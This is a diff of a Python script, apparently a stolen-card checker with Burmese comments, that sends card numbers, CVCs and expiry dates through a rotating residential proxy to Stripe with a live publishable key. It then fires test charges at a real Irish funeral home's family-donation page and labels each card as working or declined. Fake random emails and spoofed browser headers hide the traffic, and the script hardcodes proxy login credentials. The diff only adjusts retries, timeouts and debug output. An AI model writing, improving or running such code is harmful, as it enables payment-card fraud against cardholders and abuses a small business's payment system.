@@ -1,21 +1,18 @@
 import requests, re
 import random
 import string
+import time
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
 # ==========================================
-# 👇 PROXY SETTINGS (US Virginia Beach 🇺🇸 + Auto Retry)
+# 👇 PROXY SETTINGS
 # ==========================================
-
 PROXY_HOST = 'geo.g-w.info'
 PROXY_PORT = '10080'
-
-# 🔥 မင်းရဲ့ Proxy User/Pass
 PROXY_USER = 'user-7xkEOw8bXcNNWHHW-type-residential-session-fza74r8r-country-US-city-San_Francisco-rotation-15'
 PROXY_PASS = 'CMvQFPYozpgFTlXC'
 
-# Proxy String
 proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
 proxies = {
     'http': proxy_url,
@@ -37,11 +34,10 @@ def Tele(ccx):
         random_name = ''.join(random.choice(letters) for i in range(10))
         random_email = f"{random_name}@gmail.com"
 
-        # 🔥 RETRY SYSTEM UPGRADE (Connection ငြိမ်အောင်)
+        # 🔥 RETRY SYSTEM (Connection ငြိမ်အောင်)
         session = requests.Session()
-        # Total=5 ခါကြိုးစားမယ်, 500/502/503/504 error တွေကို auto retry လုပ်မယ်
         retry = Retry(
-            total=5, 
+            total=3, 
             backoff_factor=1, 
             status_forcelist=[500, 502, 503, 504]
         )
@@ -56,54 +52,44 @@ def Tele(ccx):
         headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
-            'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
             'referer': 'https://js.stripe.com/',
-            # 🔥 User-Agent ကို PC (Windows 10) ပြောင်းလိုက်ပြီ
-            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-            'sec-ch-ua-mobile': '?0',  # Mobile မဟုတ်ကြောင်း (?0)
-            'sec-ch-ua-platform': '"Windows"', # Platform Windows
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         }
         
         data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51JNN5kCPT27SWWccxqzoGW8uBAVSg8XaS1aFtpbAD8nRcPLmqOyajKoGVA3Pfh9mgZ7EBGaro0mS9BrLxwO2yCmH00ssRNida2'
         
-        # Timeout ကို 60s ထိ တိုးပေးထားတယ်
         response = session.post(
             'https://api.stripe.com/v1/payment_methods',
             headers=headers,
             data=data,
-            timeout=60 
+            timeout=40 
         )
 
-        if 'id' not in response.json():
+        # 🔥 DEBUGGING ERROR HERE 🔥
+        try:
+            json_response = response.json()
+        except:
+            return "Proxy Error (Invalid JSON) ❌"
+
+        if 'id' not in json_response:
+            # Console မှာ Error အစစ်ကို ထုတ်ပြမယ်
+            print(f"❌ Stripe Blocked {n}: {json_response}") 
             return "Proxy Error (PM Failed) ❌"
             
-        pm = response.json()['id']
+        pm = json_response['id']
 
         # ==========================================
-        # Step 2: Charge Request (Brendan Ennis Funerals)
+        # Step 2: Charge Request
         # ==========================================
         headers = {
             'Accept': 'application/json, text/javascript, */*; q=0.01',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Connection': 'keep-alive',
             'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'Origin': 'https://brendanennisfunerals.ie',
             'Referer': 'https://brendanennisfunerals.ie/help-a-family-with-costs/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin',
-            # 🔥 Step 2 မှာလည်း User-Agent ကို Windows နဲ့ ညီအောင်ညှိပေးထားတယ်
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'X-Requested-With': 'XMLHttpRequest',
-            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
         }
 
         data = {
@@ -123,7 +109,6 @@ def Tele(ccx):
             'wpfs-stripe-payment-method-id': f'{pm}',
         }
 
-        # Timeout ကို 60s ထိ တိုးပေးထားတယ်
         response = session.post(
             'https://brendanennisfunerals.ie/wp-admin/admin-ajax.php',
             headers=headers,
@@ -140,7 +125,6 @@ def Tele(ccx):
                 result = "Decline⛔"
 
     except Exception as e:
-        # ၅ ခါလုံး Retry လုပ်လို့မှ မရရင်တော့ တကယ် Error ပါ
         result = f"Connection Failed (Retry Limit) ⚠️"
         
     return result
